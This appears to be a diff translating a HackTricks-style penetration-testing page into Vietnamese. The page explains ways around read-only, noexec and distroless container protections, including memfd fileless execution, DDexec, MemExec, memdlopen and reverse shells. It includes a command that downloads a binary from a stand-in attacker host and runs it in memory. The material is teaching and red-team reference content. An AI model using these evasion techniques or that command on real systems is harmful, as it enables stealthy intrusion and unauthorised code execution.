@@ -1,17 +1,17 @@
-# Bypass FS protections: read-only / no-exec / Distroless
+# Vượt qua các biện pháp bảo vệ FS: read-only / no-exec / Distroless
 
 {{#include ../../../../banners/hacktricks-training.md}}
 
 ## Videos
 
-In the following videos you can find the techniques mentioned in this page explained more in depth:<sup>[[1]](#references)[[2]](#references)</sup>
+Trong các video sau, bạn có thể tìm hiểu chi tiết hơn về các kỹ thuật được đề cập trên trang này:<sup>[[1]](#references)[[2]](#references)</sup>
 
 - [**DEF CON 31 - Exploring Linux Memory Manipulation for Stealth and Evasion**](https://www.youtube.com/watch?v=poHirez8jk4).<sup>[[1]](#references)</sup>
 - [**Stealth intrusions with DDexec-ng & in-memory dlopen() - HackTricks Track 2023**](https://www.youtube.com/watch?v=VM_gjjiARaU).<sup>[[2]](#references)</sup>
 
-## read-only / no-exec scenario
+## Tình huống read-only / no-exec
 
-In a container, you can mount the root filesystem as read-only by setting **`readOnlyRootFilesystem: true`** in the security context.<sup>[[3]](#references)</sup> For example:
+Trong container, bạn có thể mount root filesystem ở chế độ read-only bằng cách đặt **`readOnlyRootFilesystem: true`** trong security context.<sup>[[3]](#references)</sup> Ví dụ:
 
 <pre class="language-yaml"><code class="lang-yaml">apiVersion: v1
 kind: Pod
@@ -26,49 +26,49 @@ spec:
 </strong>    command: ["sh", "-c", "while true; do sleep 1000; done"]
 </code></pre>
 
-A read-only root does not make separately mounted volumes read-only. Docker treats **`/dev/shm`** as an IPC mount, while tmpfs options such as `rw` and `noexec` are runtime configuration choices; inspect the target container's mount options before relying on either behavior.<sup>[[4]](#references)[[5]](#references)</sup>
+Root filesystem ở chế độ read-only không khiến các volume được mount riêng cũng chuyển sang read-only. Docker xem **`/dev/shm`** là một IPC mount, còn các tùy chọn tmpfs như `rw` và `noexec` là lựa chọn cấu hình lúc chạy; hãy kiểm tra tùy chọn mount của container mục tiêu trước khi dựa vào một trong hai hành vi này.<sup>[[4]](#references)[[5]](#references)</sup>
 
 > [!WARNING]
-> From a red-team perspective, that combination can make it difficult to download and execute binaries that are not already available (for example, backdoors or enumeration tools).<sup>[[4]](#references)[[5]](#references)</sup>
+> Từ góc độ red-team, sự kết hợp này có thể gây khó khăn khi tải xuống và thực thi các binary chưa có sẵn (ví dụ: backdoor hoặc công cụ enumeration).<sup>[[4]](#references)[[5]](#references)</sup>
 
-## Easiest bypass: Scripts
+## Cách bypass đơn giản nhất: Scripts
 
-A `noexec` mount blocks direct execution of binaries on that mount, but an interpreter can still read and interpret a script. If `sh` or `python` is present, you can therefore run a shell or Python script through that interpreter.<sup>[[5]](#references)</sup>
+Mount `noexec` chặn việc thực thi trực tiếp các binary trên mount đó, nhưng interpreter vẫn có thể đọc và diễn giải một script. Vì vậy, nếu có `sh` hoặc `python`, bạn có thể chạy shell script hoặc Python script thông qua interpreter tương ứng.<sup>[[5]](#references)</sup>
 
-This does not help when the required tool is itself a binary.<sup>[[5]](#references)</sup>
+Cách này không hữu ích khi chính công cụ cần dùng là một binary.<sup>[[5]](#references)</sup>
 
-## Memory Bypasses
+## Bypass bằng memory
 
-When direct execution from a mounted path is blocked, one option is to load the ELF into memory and execute it through an in-memory path. This avoids the `noexec` check on that mount, but does not remove other kernel, permission, or policy controls.<sup>[[5]](#references)[[6]](#references)</sup>
+Khi không thể thực thi trực tiếp từ một đường dẫn đã mount, một lựa chọn là nạp ELF vào memory rồi thực thi thông qua một đường dẫn trong memory. Cách này tránh kiểm tra `noexec` trên mount đó, nhưng không loại bỏ các biện pháp kiểm soát khác của kernel, quyền hạn hoặc policy.<sup>[[5]](#references)[[6]](#references)</sup>
 
-### FD + exec syscall bypass
+### Bypass bằng FD + exec syscall
 
-If a scripting runtime can access the relevant Linux interface, it can create an anonymous, RAM-backed file descriptor with **`memfd_create(2)`**, write the ELF bytes to it, and use an fd-backed execution path. The project [**fileless-elf-exec**](https://github.com/nnsee/fileless-elf-exec) generates compressed and base64-encoded Python, Perl, or Ruby code for this workflow.<sup>[[6]](#references)[[7]](#references)</sup>
+Nếu scripting runtime có thể truy cập interface Linux liên quan, nó có thể tạo một file descriptor ẩn danh, được hỗ trợ bởi RAM bằng **`memfd_create(2)`**, ghi các byte ELF vào đó rồi sử dụng đường dẫn thực thi dựa trên fd. Dự án [**fileless-elf-exec**](https://github.com/nnsee/fileless-elf-exec) tạo mã Python, Perl hoặc Ruby được nén và mã hóa base64 cho quy trình này.<sup>[[6]](#references)[[7]](#references)</sup>
 
-The project currently documents Python, Perl, and Ruby targets; PHP or Node need a different runtime-specific technique or extension, so the absence of this generator for a language does not mean that in-memory execution is impossible.<sup>[[6]](#references)[[12]](#references)</sup>
+Hiện dự án chỉ tài liệu hóa các target Python, Perl và Ruby; PHP hoặc Node cần kỹ thuật hoặc phần mở rộng riêng cho runtime, vì vậy việc không có generator cho một ngôn ngữ không có nghĩa là không thể thực thi trong memory.<sup>[[6]](#references)[[12]](#references)</sup>
 
-See [Linux Fileless Execution](../../../post-exploitation/linux-fileless-execution.md) for the broader coverage of anonymous-file execution, related staging patterns, and detection and forensic collection.
+Xem [Linux Fileless Execution](../../../post-exploitation/linux-fileless-execution.md) để tìm hiểu rộng hơn về thực thi file ẩn danh, các mẫu staging liên quan, cũng như việc phát hiện và thu thập dữ liệu pháp chứng.
 
 > [!WARNING]
-> A regular executable written to **`/dev/shm`** remains subject to that mount's **`noexec`** setting; merely opening it through an ordinary file descriptor does not change the mount policy.<sup>[[5]](#references)</sup>
+> Một executable thông thường được ghi vào **`/dev/shm`** vẫn chịu ảnh hưởng của thiết lập **`noexec`** trên mount đó; chỉ mở file bằng file descriptor thông thường không làm thay đổi policy của mount.<sup>[[5]](#references)</sup>
 >
-> The exact memory-execution method also depends on the runtime, architecture, kernel, and available permissions.<sup>[[6]](#references)[[7]](#references)[[12]](#references)</sup>
+> Phương pháp thực thi trong memory cụ thể cũng phụ thuộc vào runtime, kiến trúc, kernel và quyền hạn hiện có.<sup>[[6]](#references)[[7]](#references)[[12]](#references)</sup>
 
 ### DDexec / EverythingExec
 
-[**DDexec / EverythingExec**](https://github.com/arget13/DDexec) writes a stager and loader into the running shell process through **`/proc/self/mem`**, then transfers control to that code.<sup>[[8]](#references)</sup>
+[**DDexec / EverythingExec**](https://github.com/arget13/DDexec) ghi stager và loader vào tiến trình shell đang chạy thông qua **`/proc/self/mem`**, sau đó chuyển quyền điều khiển sang đoạn mã đó.<sup>[[8]](#references)</sup>
 
-This lets the process load a supplied binary without first placing that binary on an executable filesystem.<sup>[[8]](#references)</sup>
+Nhờ vậy, tiến trình có thể nạp một binary được cung cấp mà không cần ghi binary đó trước vào filesystem có quyền thực thi.<sup>[[8]](#references)</sup>
 
 > [!TIP]
-> **DDexec / EverythingExec** can load and **execute** shellcode or a binary from **memory**.<sup>[[8]](#references)</sup>
+> **DDexec / EverythingExec** có thể nạp và **thực thi** shellcode hoặc binary từ **memory**.<sup>[[8]](#references)</sup>
 
 ```bash
 # Basic example
 wget -O- https://attacker.com/binary.elf | base64 -w0 | bash ddexec.sh argv0 foo bar
 ```
 
-For more information about this technique check the Github or:
+Để biết thêm thông tin về kỹ thuật này, hãy xem Github hoặc:
 
 {{#ref}}
 ddexec.md
@@ -76,60 +76,59 @@ ddexec.md
 
 ### MemExec
 
-[**Memexec**](https://github.com/arget13/memexec) is a daemonized DDexec implementation. Its daemon listens for requests containing arguments and raw program bytes, forks a child to load and run each program, and keeps the parent as the server.<sup>[[9]](#references)</sup>
+[**Memexec**](https://github.com/arget13/memexec) là một triển khai DDexec chạy dưới dạng daemon. Daemon lắng nghe các yêu cầu chứa tham số và byte thô của chương trình, tạo tiến trình con để tải và chạy từng chương trình, đồng thời giữ tiến trình cha làm máy chủ.<sup>[[9]](#references)</sup>
 
-The repository includes an example of using **memexec to execute binaries from a PHP reverse shell** in [a.php](https://github.com/arget13/memexec/blob/main/a.php).<sup>[[9]](#references)</sup>
+Repository có ví dụ sử dụng **memexec để thực thi binary từ PHP reverse shell** trong [a.php](https://github.com/arget13/memexec/blob/main/a.php).<sup>[[9]](#references)</sup>
 
 ### Memdlopen
 
-With a similar purpose to DDexec, [**memdlopen**](https://github.com/arget13/memdlopen) is a fileless `dlopen()` implementation for a shared object or program. Its README currently documents ARM64 support, so check the target architecture before using it.<sup>[[10]](#references)</sup>
+Có mục đích tương tự DDexec, [**memdlopen**](https://github.com/arget13/memdlopen) là một triển khai `dlopen()` không dùng file dành cho shared object hoặc chương trình. README hiện ghi nhận hỗ trợ ARM64, vì vậy hãy kiểm tra kiến trúc mục tiêu trước khi sử dụng.<sup>[[10]](#references)</sup>
 
-## Distroless Bypass
+## Bypass Distroless
 
-For a dedicated explanation of **what distroless actually is**, when it helps, when it does not, and how it changes post-exploitation tradecraft in containers, check:
+Để tìm hiểu riêng **distroless thực chất là gì**, khi nào nó hữu ích, khi nào không, và nó thay đổi tradecraft hậu khai thác trong container như thế nào, hãy xem:
 
 {{#ref}}
 ../../../containers-namespaces/container-security/distroless.md
 {{#endref}}
 
-### What is distroless
+### Distroless là gì
 
-Distroless images contain only the application and its runtime dependencies; the official images omit package managers, shells, and other programs expected in a standard Linux distribution.<sup>[[11]](#references)</sup>
+Image distroless chỉ chứa ứng dụng và các dependency runtime của nó; các image chính thức không có package manager, shell và những chương trình khác thường có trong một bản phân phối Linux tiêu chuẩn.<sup>[[11]](#references)</sup>
 
-Keeping the runtime image to those dependencies reduces the software present in production and the amount that must be scanned and tracked.<sup>[[11]](#references)</sup>
+Việc giới hạn image runtime ở các dependency đó giúp giảm lượng phần mềm có mặt trong môi trường production, cũng như giảm lượng phần mềm cần được quét và theo dõi.<sup>[[11]](#references)</sup>
 
 ### Reverse Shell
 
-In a distroless container you might **not find `sh` or `bash`** for a regular shell, nor common utilities such as `ls`, `whoami`, or `id`.<sup>[[11]](#references)</sup>
+Trong container distroless, bạn có thể **không tìm thấy `sh` hoặc `bash`** để mở shell thông thường, cũng như các tiện ích phổ biến như `ls`, `whoami` hoặc `id`.<sup>[[11]](#references)</sup>
 
 > [!WARNING]
-> Therefore, a usual shell-based reverse shell or utility-based enumeration may not work.<sup>[[11]](#references)</sup>
+> Vì vậy, Reverse Shell thông thường dựa trên shell hoặc việc dò tìm dựa trên tiện ích có thể không hoạt động.<sup>[[11]](#references)</sup>
 
-If the compromised application includes a language runtime (for example, Python for a Flask application or Node.js for a Node application), an RCE may still be able to use that runtime for a command channel and system inspection through its APIs.<sup>[[11]](#references)[[12]](#references)</sup>
-
-> [!TIP]
-> Use the available scripting language to **enumerate the system** through its language capabilities.<sup>[[12]](#references)</sup>
-
-If there are no **read-only/no-exec** protections, a command channel may write binaries to a writable, executable mount and run them; verify the mount options and permissions first.<sup>[[4]](#references)[[5]](#references)</sup>
+Nếu ứng dụng bị xâm nhập có chứa runtime của một ngôn ngữ (ví dụ: Python cho ứng dụng Flask hoặc Node.js cho ứng dụng Node), RCE vẫn có thể sử dụng runtime đó để tạo kênh lệnh và kiểm tra hệ thống thông qua các API của nó.<sup>[[11]](#references)[[12]](#references)</sup>
 
 > [!TIP]
-> When these protections are present, use the **memory-execution techniques above** where the runtime, kernel, and permissions allow.<sup>[[6]](#references)[[8]](#references)[[10]](#references)</sup>
+> Sử dụng ngôn ngữ lập trình có sẵn để **dò tìm hệ thống** bằng các khả năng của ngôn ngữ đó.<sup>[[12]](#references)</sup>
 
-You can find **examples** of exploiting RCE vulnerabilities to obtain scripting-language **reverse shells** and execute binaries from memory in [**DistrolessRCE**](https://github.com/carlospolop/DistrolessRCE).<sup>[[12]](#references)</sup>
+Nếu không có các biện pháp bảo vệ **read-only/no-exec**, một kênh lệnh có thể ghi binary vào mount có quyền ghi và thực thi, rồi chạy chúng; trước tiên hãy xác minh các tùy chọn mount và quyền truy cập.<sup>[[4]](#references)[[5]](#references)</sup>
+
+> [!TIP]
+> Khi có các biện pháp bảo vệ này, hãy sử dụng **các kỹ thuật thực thi trong bộ nhớ ở trên** nếu runtime, kernel và quyền cho phép.<sup>[[6]](#references)[[8]](#references)[[10]](#references)</sup>
+
+Bạn có thể tìm thấy **ví dụ** khai thác lỗ hổng RCE để tạo **Reverse Shell** bằng ngôn ngữ lập trình và thực thi binary từ bộ nhớ trong [**DistrolessRCE**](https://github.com/carlospolop/DistrolessRCE).<sup>[[12]](#references)</sup>
 
 ## References
 
-- [1] [DEF CON 31 - Exploring Linux Memory Manipulation for Stealth and Evasion](https://www.youtube.com/watch?v=poHirez8jk4)
-- [2] [Stealth intrusions with DDexec-ng & in-memory dlopen() - HackTricks Track 2023](https://www.youtube.com/watch?v=VM_gjjiARaU)
-- [3] [Configure a Security Context for a Pod or Container](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/)
+- [1] [DEF CON 31 - Khám phá thao tác bộ nhớ Linux để ẩn mình và né tránh](https://www.youtube.com/watch?v=poHirez8jk4)
+- [2] [Xâm nhập ẩn mình bằng DDexec-ng và dlopen() trong bộ nhớ - HackTricks Track 2023](https://www.youtube.com/watch?v=VM_gjjiARaU)
+- [3] [Cấu hình Security Context cho Pod hoặc Container](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/)
 - [4] [docker container run](https://docs.docker.com/reference/cli/docker/container/run)
-- [5] [mount(8) - Linux manual page](https://man7.org/linux/man-pages/man8/mount.8.html)
+- [5] [mount(8) - Trang hướng dẫn sử dụng Linux](https://man7.org/linux/man-pages/man8/mount.8.html)
 - [6] [fileless-elf-exec](https://github.com/nnsee/fileless-elf-exec)
-- [7] [memfd_create(2) - Linux manual page](https://man7.org/linux/man-pages/man2/memfd_create.2.html)
+- [7] [memfd_create(2) - Trang hướng dẫn sử dụng Linux](https://man7.org/linux/man-pages/man2/memfd_create.2.html)
 - [8] [DDexec](https://github.com/arget13/DDexec)
 - [9] [memexec](https://github.com/arget13/memexec)
 - [10] [memdlopen](https://github.com/arget13/memdlopen)
 - [11] [GoogleContainerTools/distroless](https://github.com/GoogleContainerTools/distroless)
 - [12] [DistrolessRCE](https://github.com/carlospolop/DistrolessRCE)
-
 {{#include ../../../../banners/hacktricks-training.md}}
